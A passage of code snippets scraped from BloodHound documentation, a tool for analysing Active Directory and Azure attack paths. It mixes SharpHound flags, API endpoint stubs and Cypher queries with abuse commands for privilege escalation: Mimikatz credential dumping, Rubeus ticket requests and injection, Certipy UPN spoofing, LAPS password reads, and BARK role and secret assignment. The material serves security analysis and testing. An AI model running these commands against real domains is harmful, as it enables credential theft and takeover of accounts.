Linux\nDESCRIPTION: Uses ldapmodify to remove Service Principal Name (SPN) entries from the victim computer to prevent conflicts when changing the dNSHostName attribute.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc9b.mdx#2025-04-23_snippet_9\n\nLANGUAGE: bash\nCODE:\n```\necho -e \"dn: VICTIM-DN\\nchangetype: modify\\ndelete: servicePrincipalName\\nservicePrincipalName: SPN\" | ldapmodify -x -D \"ATTACKER-DN\" -w 'PWD' -h DOMAIN-DNS-NAME\n```\n\n----------------------------------------\n\nTITLE: Configuring SharpHound Enterprise Settings\nDESCRIPTION: JSON configuration example for SharpHound Enterprise settings.json file, showing how to set the RestEndpoint and optional proxy settings.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/install-data-collector/install-sharphound/installation-upgrade.mdx#2025-04-23_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"RestEndpoint\": \"CODENAME.bloodhoundenterprise.io\",\n  \"Proxy\": \"proxy.acme.com:8080\"\n}\n```\n\n----------------------------------------\n\nTITLE: Adding a New Secret to a Target App Registration in Azure\nDESCRIPTION: This code shows how to use BARK's New-AppRegSecret function to add a new secret to a target application using the previously acquired MS Graph token. This allows an attacker to gain control of the Service Principal.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/az-add-secret.mdx#2025-04-23_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nNew-AppRegSecret -AppRegObjectID \"d878...\" -Token $MGToken.access_token\n```\n\n----------------------------------------\n\nTITLE: Requesting TGT with Rubeus (Windows)\nDESCRIPTION: This command uses Rubeus to request a ticket granting ticket (TGT) from the domain, specifying the target identity to impersonate and the PFX-formatted certificate.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc1.mdx#2025-04-23_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\nRubeus asktgt /user:forestrootda /domain:forestroot.com /certificate:cert.pfx /password:asdf /ptt\n```\n\n----------------------------------------\n\nTITLE: Creating PFX Certificate with Certutil in Windows\nDESCRIPTION: Uses certutil to create a .pfx version of the CA certificate from separate .pem and .key files.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/golden-cert.mdx#2025-04-23_snippet_1\n\nLANGUAGE: Batch\nCODE:\n```\ncertutil.exe -MergePFX .\\cert.pem .\\cert.pfx\n```\n\n----------------------------------------\n\nTITLE: Adding Principals to Azure Security Groups using PowerZure\nDESCRIPTION: This PowerShell command demonstrates how to add a user to an Azure AD group using the PowerZure module. It requires the user's UPN (User Principal Name) and the target group name as parameters.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/az-add-members.mdx#2025-04-23_snippet_0\n\nLANGUAGE: powershell\nCODE:\n```\nAdd-AzureADGroup -User [UPN] -Group [Group name]\n```\n\n----------------------------------------\n\nTITLE: Setting Custom Output Directory for SharpHound\nDESCRIPTION: Command to specify a custom directory where SharpHound will save its output files instead of the default current directory.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/collect-data/ce-collection/sharphound-flags.mdx#2025-04-23_snippet_7\n\nLANGUAGE: batch\nCODE:\n```\nC:\\> SharpHound.exe --OutputDirectory C:\\temp\\\n```\n\n----------------------------------------\n\nTITLE: Defining GET Endpoint for Container Controllers in BloodHound API (YAML)\nDESCRIPTION: This YAML snippet defines the OpenAPI specification for a GET endpoint that retrieves controllers for a specific container in the BloodHound API. It specifies the API version and the endpoint path with a parameter for the object ID.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/containers/get-container-entity-controllers.mdx#2025-04-23_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /api/v2/containers/{object_id}/controllers\n```\n\n----------------------------------------\n\nTITLE: Creating a New Azure Automation Runbook with Arbitrary Commands\nDESCRIPTION: This snippet shows how to create a new runbook in a target Automation Account using the New-AzureAutomationAccountRunBook function from BARK. It specifies a command to execute via the -Script parameter.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/az-automation-contributor.mdx#2025-04-23_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nNew-AzureAutomationAccountRunBook `\n    -Token $ARMToken `\n    -RunBookName \"MyCoolRunBook\" `\n    -AutomationAccountPath \"https://management.azure.com/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourceGroups/AutomationAccts/providers/Microsoft.Automation/automationAccounts/MyCoolAutomationAccount\" `\n    -Script \"whoami\"\n```\n\n----------------------------------------\n\nTITLE: Configuring Service to Use gMSA\nDESCRIPTION: Command to configure SharpHound Enterprise service to use the gMSA account\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/install-data-collector/install-sharphound/create-gmsa.mdx#2025-04-23_snippet_8\n\nLANGUAGE: powershell\nCODE:\n```\nsc.exe config SHDelegator obj= \"DOMAIN\\\\t0\\_gMSA\\_SHS$\"\n```\n\n----------------------------------------\n\nTITLE: SharpHound Enterprise Authentication Configuration\nDESCRIPTION: Authentication configuration file (auth.json) that contains the credentials used by the service to authenticate with the BloodHound Enterprise API. Includes token and token identifier fields.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/install-data-collector/install-sharphound/local-configuration.mdx#2025-04-23_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n\"Token\": \"w4Tc+heVmaMTWgodlw0YlztaEGG53J/mwogiEZLvKE6WtylfYuoVEA==\",\n\"TokenID\": \"0c6120ee-2fbe-478f-a864-2e264f9c16d2\"\n}\n```\n\n----------------------------------------\n\nTITLE: Defining GET API Endpoint for Root CAs Controllers in BloodHound\nDESCRIPTION: OpenAPI endpoint specification for retrieving controllers associated with a specific Root CA. The endpoint uses a GET request to '/api/v2/rootcas/{object_id}/controllers' where object_id is the identifier of the Root CA.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/root-cas/get-root-ca-entity-controllers.mdx#2025-04-23_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /api/v2/rootcas/{object_id}/controllers\n```\n\n----------------------------------------\n\nTITLE: Retrieving Azure Key Vault Certificates using PowerZure\nDESCRIPTION: Commands for fetching and exporting certificate content from Azure Key Vaults using the PowerZure module. These commands allow retrieval of certificates stored in Azure Key Vault instances.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/az-get-certificates.mdx#2025-04-23_snippet_0\n\nLANGUAGE: powershell\nCODE:\n```\nGet-AzureKeyVaultContent\nExport-AzureKeyVaultcontent\n```\n\n----------------------------------------\n\nTITLE: Granting LAPS Password Read Access on Workstations OU\nDESCRIPTION: This PowerShell code grants the 'ITADMIN' user the ability to read LAPS passwords from all computer objects in the 'Workstations' OU. It uses various PowerView functions to create and apply the necessary ACE.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/generic-all.mdx#2025-04-23_snippet_3\n\nLANGUAGE: powershell\nCODE:\n```\n$Guids = Get-DomainGUIDMap\n$AdmPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'ms-Mcs-AdmPwd'} | select -ExpandProperty name\n$CompPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'Computer'} | select -ExpandProperty name\n$ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity itadmin -Right ExtendedRight,ReadProperty -AccessControlType Allow -ObjectType $AdmPropertyGuid -InheritanceType All -InheritedObjectType $CompPropertyGuid\n$OU = Get-DomainOU -Raw Workstations\n$DsEntry = $OU.GetDirectoryEntry()\n$dsEntry.PsBase.Options.SecurityMasks = 'Dacl'\n$dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)\n$dsEntry.PsBase.CommitChanges()\n```\n\n----------------------------------------\n\nTITLE: Converting Certificate to PFX Format (Windows)\nDESCRIPTION: Using certutil to convert the obtained certificate from PEM to PFX format for use with authentication tools.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc6a.mdx#2025-04-23_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\ncertutil.exe -MergePFX .\\cert.pem .\\cert.pfx\n```\n\n----------------------------------------\n\nTITLE: SharpHound Custom Duration Session Collection\nDESCRIPTION: Example of running SharpHound session collection with a custom loop duration specified in HH:MM:SS format.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/collect-data/ce-collection/sharphound.mdx#2025-04-23_snippet_2\n\nLANGUAGE: batch\nCODE:\n```\nC:\\> SharpHound.exe --CollectionMethods Session --Loop --Loopduration 03:09:41\n```\n\n----------------------------------------\n\nTITLE: Assigning an Entra ID Admin Role with BARK in PowerShell\nDESCRIPTION: This code shows how to use BARK's New-AzureADRoleAssignment function to grant an Entra ID role to a target principal using a previously acquired MS Graph token. The example assigns a role using principal ID and role definition ID parameters.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/az-mg-grant-role.mdx#2025-04-23_snippet_1\n\nLANGUAGE: powershell\nCODE:\n```\nNew-AzureADRoleAssignment `\n    -PrincipalID \"6b6f9289-fe92-4930-a331-9575e0a4c1d8\" `\n    -RoleDefinitionId \"62e90394-69f5-4237-9190-012177145e10\" `\n    -Token $MGToken\n```\n\n----------------------------------------\n\nTITLE: Querying LAPS Passwords with BloodyAD in Bash\nDESCRIPTION: This Bash command uses BloodyAD to search for and retrieve LAPS passwords and expiration times for all computers in the domain.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/read-laps-password.mdx#2025-04-23_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nbloodyAD --host $DC_IP -d $DOMAIN -u $USER -p $PASSWORD get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime\n```\n\n----------------------------------------\n\nTITLE: Setting Loop Duration for SharpHound Session Collection\nDESCRIPTION: Command to run SharpHound session collection in loop mode with a specific duration of 12 hours, 30 minutes, and 12 seconds.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/collect-data/ce-collection/sharphound-flags.mdx#2025-04-23_snippet_10\n\nLANGUAGE: batch\nCODE:\n```\nC:\\> SharpHound.exe --CollectionMethods Session --Loop --LoopDuration 12:30:12\n```\n\n----------------------------------------\n\nTITLE: OpenAPI Specification for Deleting a BloodHound User\nDESCRIPTION: OpenAPI specification for the DELETE endpoint that removes a user from the BloodHound system. The endpoint path includes a user_id parameter to specify which user to delete.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/bloodhound-users/delete-a-user.mdx#2025-04-23_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: delete /api/v2/bloodhound-users/{user_id}\n```\n\n----------------------------------------\n\nTITLE: Basic SharpHound CE Execution\nDESCRIPTION: Basic command to run SharpHound CE with default collection methods. Collects security group memberships, domain trusts, AD object rights, GPO links, OU structure, and computer properties.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/collect-data/ce-collection/sharphound.mdx#2025-04-23_snippet_0\n\nLANGUAGE: batch\nCODE:\n```\nC:\\> SharpHound.exe\n```\n\n----------------------------------------\n\nTITLE: Defining GET Endpoint for User Memberships in OpenAPI\nDESCRIPTION: This YAML snippet defines an OpenAPI specification for a GET endpoint that retrieves memberships for a specific user. The endpoint path includes a parameter for the user's object_id.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/ad-users/get-user-entity-membership.mdx#2025-04-23_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /api/v2/users/{object_id}/memberships\n```\n\n----------------------------------------\n\nTITLE: Obtaining Refresh Token for Azure Authentication (PowerShell)\nDESCRIPTION: This PowerShell script completes the device code flow and obtains a refresh token for Azure authentication.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/collect-data/ce-collection/azurehound.mdx#2025-04-23_snippet_4\n\nLANGUAGE: powershell\nCODE:\n```\n$body=@{\n    \"client_id\" =  \"1950a258-227b-4e31-a9cf-717495945fc2\"\n    \"grant\\_type\" = \"urn:ietf:params:oauth:grant-type:device\\_code\"\n    \"code\" =       $authResponse.device_code\n}\n$Tokens = Invoke-RestMethod `\n    -UseBasicParsing `\n    -Method Post `\n    -Uri \"https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0\" `\n    -Headers $Headers `\n    -Body $body\n$Tokens\n```\n\n----------------------------------------\n\nTITLE: Creating PSCredential Object for Authentication in PowerView\nDESCRIPTION: This snippet demonstrates how to create a PSCredential object in PowerShell for authentication when abusing AddSelf privileges. The credentials will be used to authenticate to the Domain Controller.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/add-self.mdx#2025-04-23_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\\\dfm.a', $SecPassword)\n```\n\n----------------------------------------\n\nTITLE: Creating PSCredential Object for Domain Authentication in PowerShell\nDESCRIPTION: Creates a PowerShell credential object using a plaintext password for domain authentication. This is required for authenticating to the Domain Controller when using Set-DomainObjectOwner.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/write-owner.mdx#2025-04-23_snippet_0\n\nLANGUAGE: powershell\nCODE:\n```\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\\\dfm.a', $SecPassword)\n```\n\n----------------------------------------\n\nTITLE: Acquiring MS Graph Token with BARK\nDESCRIPTION: Uses BARK's Get-GraphTokenWithRefreshToken function to obtain an MS Graph-scoped JWT using a refresh token and tenant ID.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/az-add-owner.mdx#2025-04-23_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n$MGToken = Get-GraphTokenWithRefreshToken `\n    -RefreshToken \"0.ARwA6WgJJ9X2qk...\" `\n    -TenantID \"contoso.onmicrosoft.com\"\n```\n\n----------------------------------------\n\nTITLE: Querying SQL Server Database Information with PowerUpSQL in PowerShell\nDESCRIPTION: This command retrieves a list of databases, their sizes, and encryption status from a SQL Server instance using PowerUpSQL's Get-SQLDatabaseThreaded function with multithreading capabilities.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/sql-admin.mdx#2025-04-23_snippet_0\n\nLANGUAGE: powershell\nCODE:\n```\nGet-SQLDatabaseThreaded –Verbose -Instance sqlserver\\instance –Threads 10 -NoDefaults\n```\n\n----------------------------------------\n\nTITLE: Injecting DC TGT into Memory using Rubeus in Windows\nDESCRIPTION: This command uses Rubeus to inject the captured Domain Controller's Ticket Granting Ticket (TGT) into memory on a Windows machine.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/coerce-to-tgt.mdx#2025-04-23_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\nRubeus.exe ptt /ticket:doIFvjCCBbqgAwI...\n```\n\n----------------------------------------\n\nTITLE: Enrolling Certificate with Certipy on Linux\nDESCRIPTION: This command uses Certipy to request a certificate from a specified CA and template. It shows how to exploit AllExtendedRights privilege on a certificate template from a Linux environment.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/all-extended-rights.mdx#2025-04-23_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\ncertipy req -u USER@CORP.LOCAL -p PWD -ca CA-NAME -target SERVER -template TEMPLATE\n```\n\n----------------------------------------\n\nTITLE: Running SharpHound in Loop Mode for Local Group Collection\nDESCRIPTION: Command to run SharpHound in loop mode for collecting local group memberships, which will repeatedly collect data over time.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/collect-data/ce-collection/sharphound-flags.mdx#2025-04-23_snippet_9\n\nLANGUAGE: batch\nCODE:\n```\nC:\\> SharpHound.exe --CollectionMethods LocalGroup --Loop\n```\n\n----------------------------------------\n\nTITLE: Defining OpenAPI GET Endpoint for PS Remote Rights in BloodHound\nDESCRIPTION: YAML specification for the GET /api/v2/computers/{object_id}/ps-remote-rights endpoint. This endpoint retrieves PS Remote rights for a specific computer in BloodHound, identified by its object_id.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/computers/get-computer-entity-remote-powershell-rights.mdx#2025-04-23_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /api/v2/computers/{object_id}/ps-remote-rights\n```\n\n----------------------------------------\n\nTITLE: Executing Mimikatz Credential Gathering Commands\nDESCRIPTION: Commands to use Mimikatz for gathering credentials from user sessions, including accessing wdigest and logon passwords from memory. Requires high integrity process with SeDebugPrivilege.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/has-session.mdx#2025-04-23_snippet_0\n\nLANGUAGE: powershell\nCODE:\n```\nsekurlsa::wdigest\nsekurlsa::logonpasswords\n```\n\n----------------------------------------\n\nTITLE: Collecting Session Data with SharpHound\nDESCRIPTION: Command to run SharpHound with the session collection method, which gathers user session information from domain-joined computers.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/collect-data/ce-collection/sharphound-flags.mdx#2025-04-23_snippet_0\n\nLANGUAGE: batch\nCODE:\n```\nC:\\> SharpHound.exe --CollectionMethods session\n```\n\n----------------------------------------\n\nTITLE: Advanced Cypher Query Using WITH Clause in BloodHound\nDESCRIPTION: A complex Cypher query that combines multiple queries with the WITH keyword to find computers where members of a specific group have active sessions. This demonstrates how to build multi-step queries to analyze complex relationships.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/analyze-data/bloodhound-gui/cypher-search.mdx#2025-04-23_snippet_4\n\nLANGUAGE: cypher\nCODE:\n```\nMATCH p=shortestPath((m:User)-[r:MemberOf*1..]->(n:Group))WHERE n.name = \"$name_of_group\"WITH m MATCH q=((m)<-[:HasSession]-(o:Computer)) RETURN count(o)\n```\n\n----------------------------------------\n\nTITLE: Combining Results with UNION Clauses in Cypher\nDESCRIPTION: Shows how to combine results from multiple MATCH clauses using UNION ALL. Returns names from nodes with different labels.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/packages/go/cypher/README.md#2025-04-23_snippet_32\n\nLANGUAGE: cypher\nCODE:\n```\nMATCH (V1:LabelA)\nRETURN V1.Name AS v1Name\nUNION ALL\nMATCH (V2:LabelB)\nRETURN V2.Name AS v2Name\n```\n\n----------------------------------------\n\nTITLE: OpenAPI Endpoint Definition for Retrieving Available Domains in BloodHound\nDESCRIPTION: Defines the REST API endpoint for retrieving available domains in BloodHound. This is a GET endpoint at /api/v2/available-domains that works in both Enterprise and Community editions.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/search/get-available-domains.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/available-domains\n```\n\n----------------------------------------\n\nTITLE: API Key/ID Authentication Headers for BloodHound API\nDESCRIPTION: Example of the HTTP headers required when authenticating with the BloodHound API using an API key/ID pair. This includes the authorization header with the token ID, a timestamp in RFC3339 format, and a base64-encoded HMAC signature.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/integrations/bloodhound-api/working-with-api.mdx#2025-04-23_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n'Authorization': bhesignature $TOKEN_ID\n'RequestDate': $RFC3339_DATETIME\n'Signature': $BASE64ENCODED_HMAC_SIGNATURE\n```\n\n----------------------------------------\n\nTITLE: Using JWT Bearer Token for API Authentication in BloodHound\nDESCRIPTION: Example of the HTTP header structure required when authenticating with the BloodHound API using a JWT token generated through the login process. This method is primarily intended for end-user access to the web-based application.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/integrations/bloodhound-api/working-with-api.mdx#2025-04-23_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n'Authorization': Bearer $JWT_TOKEN\n```\n\n----------------------------------------\n\nTITLE: Generating Password Hash with Rubeus\nDESCRIPTION: Uses Rubeus to convert the plaintext password of the attacker-controlled machine account into its RC4_HMAC form, which is needed for the S4U request.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/allowed-to-act.mdx#2025-04-23_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\nRubeus.exe hash /password:Summer2018!\n```\n\n----------------------------------------\n\nTITLE: Executing PowerShell Commands via SQL Agent Jobs with PowerUpSQL\nDESCRIPTION: This command creates and executes a SQL Agent job using the PowerShell subsystem to run PowerShell commands through PowerUpSQL's Invoke-SQLOSCmdAgentJob function.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/sql-admin.mdx#2025-04-23_snippet_4\n\nLANGUAGE: powershell\nCODE:\n```\nInvoke-SQLOSCmdAgentJob -Verbose -SubSystem PowerShell -Command 'write-output \"hello world\" | out-file c:\\windows\\temp\\test2.txt' -Sleep 20 -Instance sqlserver\\instance -username myuser -password mypassword\n```\n\n----------------------------------------\n\nTITLE: Testing Network Connectivity with PowerShell\nDESCRIPTION: PowerShell commands to test network connectivity to a specific host on port 445, measure connection time, and resolve DNS names.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/install-data-collector/install-sharphound/troubleshooting.mdx#2025-04-23_snippet_1\n\nLANGUAGE: powershell\nCODE:\n```\nTest-NetConnection -ComputerName <HOST> -Port 445\n```\n\nLANGUAGE: powershell\nCODE:\n```\nMeasure-Command { Test-NetConnection -ComputerName <HOST> -Port 445 }\n```\n\nLANGUAGE: powershell\nCODE:\n```\nResolve-DnsName -Name <HOST>\n```\n\n----------------------------------------\n\nTITLE: Setting UPN for Certificate Authentication Attack\nDESCRIPTION: Uses Certipy to update the User Principal Name (UPN) of a victim account to match the targeted principal's sAMAccountName and domain name.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc10a.mdx#2025-04-23_snippet_7\n\nLANGUAGE: bash\nCODE:\n```\ncertipy account update -u ATTACKER@CORP.LOCAL -p PWD -user VICTIM -upn Target@CORP.LOCAL\n```\n\n----------------------------------------\n\nTITLE: Changing Certificate Template Ownership in Linux\nDESCRIPTION: This bash command uses Impacket's owneredit to change the ownership of a certificate template.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc4.mdx#2025-04-23_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\nowneredit.py -action write -new-owner 'attacker' -target-dn 'template-dn' 'domain'/'attacker':'password'\n```\n\n----------------------------------------\n\nTITLE: Modifying LDAP Authentication Configuration in settings.json\nDESCRIPTION: Demonstrates how to modify the SharpHound Enterprise settings.json file to enable LDAP auto-negotiation for external trust collection by setting ForceLDAPKerberosAuth to False.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/collect-data/enterprise-collection/cross-trust.mdx#2025-04-23_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"ForceLDAPKerberosAuth\": false\n}\n```\n\n----------------------------------------\n\nTITLE: Monitoring BHE Data Flow Progress in Splunk\nDESCRIPTION: This search query monitors the data ingestion progress from BloodHound Enterprise into Splunk. It filters internal logs for entries related to the BHE integration.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/integrations/integrations/splunk.mdx#2025-04-23_snippet_0\n\nLANGUAGE: splunk\nCODE:\n```\nindex=_internal source=\"*splunkd.log\" \"BHE \"\n```\n\n----------------------------------------\n\nTITLE: Monitoring for TGTs using Rubeus in Windows\nDESCRIPTION: This command uses Rubeus to monitor for incoming Ticket Granting Tickets (TGTs) from a specific Domain Controller.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/coerce-to-tgt.mdx#2025-04-23_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nRubeus.exe request monitor /user:<target DC DNS name> /interval:5 /nowrap\n```\n\n----------------------------------------\n\nTITLE: Inspecting Relationship Label in Cypher\nDESCRIPTION: This Cypher query demonstrates inspecting a relationship label using the type function, which adds weight to the query's cost in the analyzer's model.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/packages/go/cypher/README.md#2025-04-23_snippet_6\n\nLANGUAGE: cypher\nCODE:\n```\nmatch (p:Person)-[r]->() where not type(r) in [\"RLabel1\", \"RLabel2\"] return p\n```\n\n----------------------------------------\n\nTITLE: Resetting BloodHound CE Password on Windows\nDESCRIPTION: PowerShell command to reset the BloodHound Community Edition password using BloodHound CLI on Windows systems.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/get-started/quickstart/community-edition-quickstart.mdx#2025-04-23_snippet_9\n\nLANGUAGE: powershell\nCODE:\n```\n.\\bloodhound-cli resetpwd\n```\n\n----------------------------------------\n\nTITLE: Installing BloodHound CE on Windows\nDESCRIPTION: PowerShell command to install BloodHound Community Edition using BloodHound CLI on Windows systems.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/get-started/quickstart/community-edition-quickstart.mdx#2025-04-23_snippet_7\n\nLANGUAGE: powershell\nCODE:\n```\n.\\bloodhound-cli install\n```\n\n----------------------------------------\n\nTITLE: Verifying Group Membership with PowerView\nDESCRIPTION: Uses PowerView's Get-DomainGroupMember cmdlet to verify successful addition of a member to a domain group.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/add-member.mdx#2025-04-23_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\nGet-DomainGroupMember -Identity 'Domain Admins'\n```\n\n----------------------------------------\n\nTITLE: Collecting Azure AD Service Principals with PowerShell BARK\nDESCRIPTION: Uses BARK to collect all Service Principal objects in the Azure AD tenant.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/az-mg-grant-app-roles.mdx#2025-04-23_snippet_1\n\nLANGUAGE: powershell\nCODE:\n```\n$SPs | ?{$_.appId -Like \"00000003-0000-0000-c000-000000000000\"} | Select id\n```\n\n----------------------------------------\n\nTITLE: Creating PSCredential Object for Authentication in PowerShell\nDESCRIPTION: Creates a PowerShell credential object to authenticate to a remote system with specified username and password, converting the plain text password to a secure string.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/can-ps-remote.mdx#2025-04-23_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\\\dfm.a', $SecPassword)\n```\n\n----------------------------------------\n\nTITLE: Executing OS Commands via SQL Agent Jobs with VBScript Subsystem in PowerUpSQL\nDESCRIPTION: This command creates and executes a SQL Agent job using the VBScript subsystem to run operating system commands through PowerUpSQL's Invoke-SQLOSCmdAgentJob function.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/sql-admin.mdx#2025-04-23_snippet_5\n\nLANGUAGE: powershell\nCODE:\n```\nInvoke-SQLOSCmdAgentJob -Verbose -SubSystem VBScript -Command 'c:\\windows\\system32\\cmd.exe /c echo hello > c:\\windows\\temp\\test3.txt' -Instance sqlserver\\instance -username myuser -password mypassword\n```\n\n----------------------------------------\n\nTITLE: Offline Registry Analysis with Mimikatz\nDESCRIPTION: Mimikatz command to extract sMSA passwords from saved registry hives on a separate system.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/dump-smsa-password.mdx#2025-04-23_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\nlsadump::secrets /system:C:\\path\\to\\file\\SYSTEM /security:C:\\path\\to\\file\\SECURITY\n```\n\n----------------------------------------\n\nTITLE: Setting UPN of Victim (Linux)\nDESCRIPTION: Sets the User Principal Name (UPN) of the victim principal to match the sAMAccountName of the targeted principal using Certipy.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc9a.mdx#2025-04-23_snippet_7\n\nLANGUAGE: bash\nCODE:\n```\ncertipy account update -username ATTACKER@CORP.LOCAL -password PWD -user VICTIM -upn Target\n```\n\n----------------------------------------\n\nTITLE: OpenAPI Configuration Endpoint Definition\nDESCRIPTION: OpenAPI specification for the GET /api/v2/config endpoint in BloodHound\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/config/list-application-config-parameters.mdx#2025-04-23_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /api/v2/config\n```\n\n----------------------------------------\n\nTITLE: Starting BloodHound UI Development Server\nDESCRIPTION: Command to start the Web UI in development mode using Yarn, running on localhost:3000 with hot-reload functionality.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/cmd/ui/README.md#2025-04-23_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\nyarn start\n```\n\n----------------------------------------\n\nTITLE: Adding Server to gMSA Password Read Group\nDESCRIPTION: PowerShell script to add SharpHound Enterprise server to the password read group\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/install-data-collector/install-sharphound/create-gmsa.mdx#2025-04-23_snippet_3\n\nLANGUAGE: powershell\nCODE:\n```\n$gmsaName = \"t0\\_gMSA\\_SHS\" # Name of the gMSA\n$shServerDN = \"&lt;DISGINGUISHED_NAME&gt;\" # Distinguished Name of the SharpHound Enterprise server\n\nAdd-ADGroupMember `\n-Identity \"$($gmsaName)_pwdRead\" `\n-Members $shServerDN `\n-PassThru\n```\n\n----------------------------------------\n\nTITLE: Obtaining CA Certificate with SharpDPAPI in Windows\nDESCRIPTION: Uses SharpDPAPI to print all certificates on the host, identifying the enterprise CA certificate where issuer and subject are identical.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/golden-cert.mdx#2025-04-23_snippet_0\n\nLANGUAGE: PowerShell\nCODE:\n```\nSharpDPAPI.exe certificates /machine\n```\n\n----------------------------------------\n\nTITLE: Using Existential Subqueries in Cypher\nDESCRIPTION: Demonstrates how to use EXISTS with a subquery to filter nodes based on relationship patterns.\nSOURCE: 